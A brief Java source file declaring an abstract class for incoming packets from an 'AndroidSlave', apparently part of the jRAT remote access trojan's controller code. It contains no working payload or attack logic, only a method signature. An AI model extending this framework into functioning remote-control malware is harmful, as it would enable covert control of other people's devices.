package se.jrat.client.packets.android.incoming;

import java.io.DataInputStream;

import se.jrat.client.android.AndroidSlave;


public abstract class AbstractIncomingAndroidPacket {

	public abstract void read(AndroidSlave slave, DataInputStream dis) throws Exception;

}
